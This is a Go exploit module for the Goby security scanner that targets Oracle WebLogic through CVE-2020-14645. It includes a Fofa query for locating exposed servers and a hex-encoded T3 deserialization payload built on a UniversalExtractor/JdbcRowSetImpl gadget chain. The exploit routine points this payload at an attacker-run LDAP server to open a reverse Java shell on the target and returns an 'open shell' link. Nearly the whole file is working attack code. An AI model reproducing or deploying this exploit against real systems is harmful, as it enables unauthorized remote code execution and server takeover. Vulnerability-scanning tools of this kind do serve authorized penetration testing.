package exploits

import (
	"encoding/hex"
	"fmt"
	"git.gobies.org/goby/goscanner/godclient"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"log"
	"net"
	"net/url"
	"strings"
	"time"
)

func init() {
	expJson := `{
    "Name": "Weblogic UniversalExtractor Code Execution Vulnerability (CVE-2020-14645)",
    "Description": "<p>WebLogic is a Java application server produced by Oracle Corporation of the United States. WebLogic is used to develop, integrate, deploy and manage large-scale distributed Web applications, network applications and database applications.</p><p>This vulnerability is due to a flaw in the application's processing of deserialized input information. An attacker can obtain the permissions of the target server by sending carefully constructed malicious requests, and execute remote commands without authorization, and finally obtain the permissions of the server.</p>",
    "Product": "Weblogic",
    "Homepage": "https://www.oracle.com/middleware/technologies/weblogic.html",
    "DisclosureDate": "2020-01-28",
    "Author": "harsonyoung@qq.com",
    "FofaQuery": "(((body=\"<h1>BEA WebLogic Server\" || server=\"Weblogic\" || body=\"content=\\\"WebLogic Server\" || body=\"<h1>Welcome to Weblogic Application\" || body=\"<h1>BEA WebLogic Server\") && header!=\"couchdb\" && header!=\"boa\" && header!=\"RouterOS\" && header!=\"X-Generator: Drupal\") || (banner=\"Weblogic\" && banner!=\"couchdb\" && banner!=\"drupal\" && banner!=\" Apache,Tomcat,Jboss\" && banner!=\"ReeCam IP Camera\" && banner!=\"<h2>Blog Comments</h2>\")) || (title==\"Error 404--Not Found\")",
    "GobyQuery": "(((body=\"<h1>BEA WebLogic Server\" || server=\"Weblogic\" || body=\"content=\\\"WebLogic Server\" || body=\"<h1>Welcome to Weblogic Application\" || body=\"<h1>BEA WebLogic Server\") && header!=\"couchdb\" && header!=\"boa\" && header!=\"RouterOS\" && header!=\"X-Generator: Drupal\") || (banner=\"Weblogic\" && banner!=\"couchdb\" && banner!=\"drupal\" && banner!=\" Apache,Tomcat,Jboss\" && banner!=\"ReeCam IP Camera\" && banner!=\"<h2>Blog Comments</h2>\")) || (title==\"Error 404--Not Found\")",
    "Level": "3",
    "Impact": "<p>This vulnerability is due to a flaw in the application's processing of deserialized input information. An attacker can obtain the permissions of the target server by sending carefully constructed malicious requests, and execute remote commands without authorization, and finally obtain the permissions of the server.</p>",
    "Recommendation": "<p>1. Turn off the T3 protocol and the IIOP protocol.</p><p>2. Upgrade the JDK to the latest version.</p><p>3. Contact the manufacturer to fix the vulnerability: <a href=\"https://www.oracle.com/middleware/technologies/weblogic.html\">https://www.oracle.com/middleware/technologies/weblogic.html</a></p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "reverse",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "2H1W",
        "Code Execution"
    ],
    "VulType": [
        "Code Execution"
    ],
    "CVEIDs": [
        "CVE-2020-14645"
    ],
    "CNNVD": [],
    "CNVD": [],
    "CVSSScore": "9.8",
    "Translation": {
        "CN": {
            "Name": "Weblogic UniversalExtractor 代码执行漏洞（CVE-2020-14645）",
            "Product": "weblogic",
            "Description": "<p>WebLogic 是美国 Oracle 公司出品的 Java 应用服务器，WebLogic 是用于开发、集成、部署和管理大型分布式 Web 应用、网络应用和数据库应用。<br></p><p>该漏洞是由于应用在处理反序列化输入信息时存在缺陷，攻击者可以通过发送精心构造的恶意请求，获得目标服务器的权限，并在未授权的情况下执行远程命令，最终获取服务器的权限。<br></p>",
            "Recommendation": "<p>1、关闭T3协议和IIOP协议。</p><p>2、升级JDK到最新版本。</p><p>3、联系厂商进行修复漏洞：<a href=\"https://www.oracle.com/middleware/technologies/weblogic.html\">https://www.oracle.com/middleware/technologies/weblogic.html</a><br><br></p>",
            "Impact": "<p>该漏洞是由于应用在处理反序列化输入信息时存在缺陷，攻击者可以通过发送精心构造的恶意请求，获得目标服务器的权限，并在未授权的情况下执行远程命令，最终获取服务器的权限。<br></p>",
            "VulType": [
                "代码执行"
            ],
            "Tags": [
                "两高一弱",
                "代码执行"
            ]
        },
        "EN": {
            "Name": "Weblogic UniversalExtractor Code Execution Vulnerability (CVE-2020-14645)",
            "Product": "Weblogic",
            "Description": "<p>WebLogic is a Java application server produced by Oracle Corporation of the United States. WebLogic is used to develop, integrate, deploy and manage large-scale distributed Web applications, network applications and database applications.</p><p>This vulnerability is due to a flaw in the application's processing of deserialized input information. An attacker can obtain the permissions of the target server by sending carefully constructed malicious requests, and execute remote commands without authorization, and finally obtain the permissions of the server.</p>",
            "Recommendation": "<p>1. Turn off the T3 protocol and the IIOP protocol.</p><p>2. Upgrade the JDK to the latest version.</p><p>3. Contact the manufacturer to fix the vulnerability: <a href=\"https://www.oracle.com/middleware/technologies/weblogic.html\">https://www.oracle.com/middleware/technologies/weblogic.html</a></p>",
            "Impact": "<p>This vulnerability is due to a flaw in the application's processing of deserialized input information. An attacker can obtain the permissions of the target server by sending carefully constructed malicious requests, and execute remote commands without authorization, and finally obtain the permissions of the server.<br></p>",
            "VulType": [
                "Code Execution"
            ],
            "Tags": [
                "2H1W",
                "Code Execution"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PostTime": "2024-09-20",
    "Variables": {},
    "PocId": "9956"
}`

	sendPayload_pueRhAKV := func(conn net.Conn, payloadHex string, isRead bool) string {
		payload, err := hex.DecodeString(payloadHex)
		if err != nil {
			return ""
		}
		_, err = conn.Write(payload)
		if err != nil {
			return ""
		}
		// 服务端不回复时，跳过读取服务端信息，否则将会卡住
		if isRead {
			resp := make([]byte, 4096)
			_, err = conn.Read(resp)
			if err != nil {
				return ""
			}
			return string(resp)
		}
		return ""
	}

	getT3Payload_pueRhAKV := func(ldapAddr string) string {
		ldapAddrLenHex := fmt.Sprintf("%x", len(ldapAddr))
		payloadLenHex := fmt.Sprintf("%x", len(ldapAddr)+100)
		payloadHead := "000006" + payloadLenHex + "086501ffffffffffffffff00000000041000aced0005737200176a6176612e7574696c2e5072696f72697479517565756594da30b4fb3f82b103000249000473697a654c000a636f6d70617261746f727400164c6a6176612f7574696c2f436f6d70617261746f723b78700000000273720030636f6d2e74616e676f736f6c2e7574696c2e636f6d70617261746f722e457874726163746f72436f6d70617261746f72f9b3bc58cc52cd210200014c000b6d5f657874726163746f727400224c636f6d2f74616e676f736f6c2f7574696c2f56616c7565457874726163746f723b78707372002e636f6d2e74616e676f736f6c2e7574696c2e657874726163746f722e556e6976657273616c457874726163746f720dc477bfff4bf18c0200025b00096d5f616f506172616d7400135b4c6a6176612f6c616e672f4f626a6563743b4c00076d5f734e616d657400124c6a6176612f6c616e672f537472696e673b7872002d636f6d2e74616e676f736f6c2e7574696c2e657874726163746f722e4162737472616374457874726163746f729b1be18ed70100e50200014900096d5f6e5461726765747870000000017074001567657444617461626173654d6574614461746128297704000000037372001d636f6d2e73756e2e726f777365742e4a646263526f77536574496d706cce26d81f4973c2050200074c0004636f6e6e7400154c6a6176612f73716c2f436f6e6e656374696f6e3b4c000d694d61746368436f6c756d6e737400124c6a6176612f7574696c2f566563746f723b4c0002707374001c4c6a6176612f73716c2f507265706172656453746174656d656e743b4c00057265734d4474001c4c6a6176612f73716c2f526573756c745365744d657461446174613b4c0006726f77734d447400254c6a617661782f73716c2f726f777365742f526f775365744d65746144617461496d706c3b4c000272737400144c6a6176612f73716c2f526573756c745365743b4c000f7374724d61746368436f6c756d6e7371007e000e7872001b6a617661782e73716c2e726f777365742e42617365526f7753657443d11da54dc2b1e002001549000b636f6e63757272656e63795a001065736361706550726f63657373696e674900086665746368446972490009666574636853697a6549000969736f6c6174696f6e49000c6d61784669656c6453697a654900076d6178526f777349000c717565727954696d656f75745a0008726561644f6e6c7949000a726f77536574547970655a000b73686f7744656c657465644c000355524c71007e00084c000b617363696953747265616d7400154c6a6176612f696f2f496e70757453747265616d3b4c000c62696e61727953747265616d71007e00144c000a6368617253747265616d7400104c6a6176612f696f2f5265616465723b4c0007636f6d6d616e6471007e00084c000a64617461536f7572636571007e00084c00096c697374656e65727371007e000e4c00036d617074000f4c6a6176612f7574696c2f4d61703b4c0006706172616d737400154c6a6176612f7574696c2f486173687461626c653b4c000d756e69636f646553747265616d71007e00147870000003f001000003e8000000000000000200000000000000000000000001000003ec0070707070707400"
		payloadTail := "737200106a6176612e7574696c2e566563746f72d9977d5b803baf010300034900116361706163697479496e6372656d656e7449000c656c656d656e74436f756e745b000b656c656d656e744461746171007e000778700000000000000000757200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078700000000a707070707070707070707870737200136a6176612e7574696c2e486173687461626c6513bb0f25214ae4b803000246000a6c6f6164466163746f724900097468726573686f6c6478703f4000000000000877080000000b000000007870707371007e001a000000000000000a7571007e001c0000000a737200116a6176612e6c616e672e496e746567657212e2a0a4f781873802000149000576616c7565787200106a6176612e6c616e672e4e756d62657286ac951d0b94e08b0200007870ffffffff71007e002471007e002471007e002471007e002471007e002471007e002471007e002471007e002471007e002478707070707371007e001a000000000000000a7571007e001c0000000a707070707070707070707871007e001878"
		// LDAP URL之前紧挨着长度
		payload := payloadHead + ldapAddrLenHex + hex.EncodeToString([]byte(ldapAddr)) + payloadTail
		return payload
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {

			ldapToken := goutils.RandomHexString(4)
			ldapURL, _ := godclient.GetGodLDAPCheckURL("U", ldapToken)

			// 得到 TCP 连接
			conn, err := httpclient.GetTCPConn(u.HostInfo)
			if err != nil {
				return false
			}
			defer conn.Close()

			// 传入 ldap地址 ,得到 T3 payload 十六进制字符串形式
			t3Payload := getT3Payload_pueRhAKV(ldapURL)

			// --------------------------- sayHello （发送 t3 协议 hello 数据包） ----------------------
			dataHello := "743320372e302e302e300a41533a31300a484c3a31390a0a"
			resp := sendPayload_pueRhAKV(conn, dataHello, true)
			// 如果包含 "HELO" 字符串表示是 weblogic ,否则不是 weblogic
			if strings.Contains(resp, "HELO") {
				// 发送 t3Payload (包含恶意反序列化数据）
				_ = sendPayload_pueRhAKV(conn, t3Payload, false)
				return godclient.PullExists(ldapToken, time.Second*20)
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			ldapURL := ""
			var waitSessionCh chan string

			attackMode := goutils.B2S(ss.Params["attackType"])
			if attackMode == "reverse" {
				waitSessionCh = make(chan string)
				// 构建反弹Shell LDAP
				rp, err := godclient.WaitSession("reverse_java", waitSessionCh)
				if err != nil || len(rp) == 0 {
					log.Println("[WARNING] godclient bind failed", err)
					expResult.Output = err.Error()
					return expResult
				}
				ldapURL = "ldap://" + godclient.GetGodServerHost() + "/E" + godclient.GetKey() + rp
			} else {
				expResult.Success = false
				expResult.Output = "未知的利用方式"
				return expResult
			}

			// 得到 TCP 连接
			conn, err := httpclient.GetTCPConn(expResult.HostInfo.HostInfo)
			if err != nil {
				expResult.Success = false
				return expResult
			}
			defer conn.Close()

			t3Payload := getT3Payload_pueRhAKV(ldapURL)
			// --------------------------- sayHello （发送 t3 协议 hello 数据包） ----------------------
			dataHello := "743320372e302e302e300a41533a31300a484c3a31390a0a"
			resp := sendPayload_pueRhAKV(conn, dataHello, true)
			// 如果包含 "HELO" 字符串表示是 weblogic ,否则不是 weblogic
			if strings.Contains(resp, "HELO") {
				// 发送 t3Payload (包含恶意反序列化数据）
				_ = sendPayload_pueRhAKV(conn, t3Payload, false)
				expResult.Success = true
			}

			if attackMode == "reverse" {
				// 执行反弹
				// 执行reverse 检测
				select {
				case webConsoleID := <-waitSessionCh:
					if u, err := url.Parse(webConsoleID); err == nil {
						expResult.Success = true
						expResult.OutputType = "html"
						sid := strings.Join(u.Query()["id"], "")
						expResult.Output += `<br/> <a href="goby://sessions/view?sid=` + sid + `&key=` + godclient.GetKey() + `">open shell</a>`
						return expResult
					}
				case <-time.After(time.Second * 20):
					expResult.Success = false
					expResult.Output = "反弹失败"
					return expResult
				}
			} else {
				expResult.Success = false
				expResult.Output = "未知的利用方式"
				return expResult
			}
			return expResult
		},
	))

}
